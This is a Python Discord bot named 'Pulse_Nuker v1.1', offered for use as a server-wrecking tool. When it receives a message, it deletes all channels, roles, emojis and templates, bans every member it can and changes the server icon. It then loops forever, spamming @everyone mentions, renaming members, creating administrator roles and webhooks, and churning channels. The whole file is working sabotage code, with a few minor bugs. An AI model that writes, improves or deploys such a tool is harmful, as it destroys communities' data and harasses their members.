import os
import discord
import time
import random
import string
from discord.utils import get

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))
    
def randcol():
    random_number = random.randint(0,16777215)
    hex_number = str(hex(random_number))
    hex_number ='0x'+ hex_number[2:]
    return hex_number


TOKEN = ("")


client=discord.Client(intents=discord.Intents.all())

global TEST
TEST = 0

@client.event
async def on_ready():
    global TEST
    global icon
    icon = open("icon.jpg", "rb").read()
    TEST = 0
    print("Pulse_Nuker v1.1 is running.\nInvite your bot and send any message to start nuke.\n\n")
    print("WARNING!!\nYou may get API Timeout from Discord server if you nuke long.\nPlease Use wisely.")
    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker v1.1'))
    
    
'''
@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")
'''


@client.event
async def on_message(message):
    global TEST
    global icon
    if TEST == 0:
        TEST = 1
        try:
            guild=message.guild
            await guild.edit(icon=icon)
        except:
            pass
        for c in message.guild.channels: 
                await c.delete()
        for user in message.guild.members:
            try:
                await user.ban()
            except:
                pass
        for role in message.guild.roles:  
            try:  
                await role.delete()
            except:
                pass
        for Emoji in message.guild.emojis:
            await Emoji.delete()
        for template in await message.guild.templates():
           await template.delete()
        await message.guild.create_text_channel(randomletters(99))
    
    response = '@everyone' #You can add some messages via editing this string
    
    while True:
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            for user in message.guild.members:
                await user.edit(nick=randomletters(5))
        except:
            print("can't change user nick")
            pass
        try:
            webhook = await message.channel.create_webhook(name="Pulse_Nuker Enhanced", reason="t")
        except:
            pass
        try:
            guild=message.guild
            await ctx.guild.edit(name=randomletters(10))
        except:
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='Pulse_Nuker Enhanced', colour=discord.Colour.random(),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        
        await guild.create_text_channel(randomletters(99))
        await guild.create_text_channel(randomletters(99))
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        
@client.event
async def on_command_error(error):
    if isinstance(error, discord.HTTPException):
        time.sleep(10)

@client.event
async def on_guild_channel_create(channel):
    await channel.send("@everyone")

client.run(TOKEN)


#Made by Pulse.
